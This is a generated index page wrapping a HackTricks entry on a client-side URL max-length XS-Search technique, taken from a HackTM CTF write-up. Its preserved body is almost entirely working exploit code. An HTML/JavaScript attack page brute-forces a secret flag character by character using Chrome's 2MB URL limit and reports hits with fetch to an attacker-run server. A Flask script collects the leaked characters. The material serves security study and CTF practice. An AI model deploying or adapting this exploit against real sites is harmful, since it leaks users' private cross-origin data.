---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# URL Max Length - Client Side

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-xs-search-url-max-length-client-side` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/xs-search/url-max-length-client-side.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [URL Max Length - Client Side](../../topics/pentesting-web/url-max-length-client-side.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-xs-search-url-max-length-client-side |
| name | URL Max Length - Client Side |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/xs-search/url-max-length-client-side.md |

## Preserved Source Material

````yaml
_body: "# URL Max Length - Client Side\n\n{{#include ../../banners/hacktricks-training.md}}\n\nCode from [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)\n\
  \n```html\n<html>\n  <body></body>\n  <script>\n    ;(async () => {\n      const curr = \"http://secrets.wtl.pw/search?query=HackTM{\"\
  \n\n      const leak = async (char) => {\n        fetch(\"/?try=\" + char)\n        let w = window.open(\n          curr\
  \ + char + \"#\" + \"A\".repeat(2 * 1024 * 1024 - curr.length - 2)\n        )\n\n        const check = async () => {\n \
  \         try {\n            w.origin\n          } catch {\n            fetch(\"/?nope=\" + char)\n            return\n\
  \          }\n          setTimeout(check, 100)\n        }\n        check()\n      }\n\n      const CHARSET = \"abcdefghijklmnopqrstuvwxyz-_0123456789\"\
  \n\n      for (let i = 0; i < CHARSET.length; i++) {\n        leak(CHARSET[i])\n        await new Promise((resolve) => setTimeout(resolve,\
  \ 50))\n      }\n    })()\n  </script>\n</html>\n```\n\nServer side:\n\n```python\nfrom flask import Flask, request\n\n\
  app = Flask(__name__)\n\nCHARSET = \"abcdefghijklmnopqrstuvwxyz-_0123456789\"\nchars = []\n\n@app.route('/', methods=['GET'])\n\
  def index():\n    global chars\n\n    nope = request.args.get('nope', '')\n    if nope:\n        chars.append(nope)\n\n\
  \    remaining = [c for c in CHARSET if c not in chars]\n\n    print(\"Remaining: {}\".format(remaining))\n\n    return\
  \ \"OK\"\n\n@app.route('/exploit.html', methods=['GET'])\ndef exploit():\n    return open('exploit.html', 'r').read()\n\n\
  if __name__ == '__main__':\n    app.run(host='0.0.0.0', port=1337)\n```\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/xs-search/url-max-length-client-side.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/xs-search/url-max-length-client-side.md
````
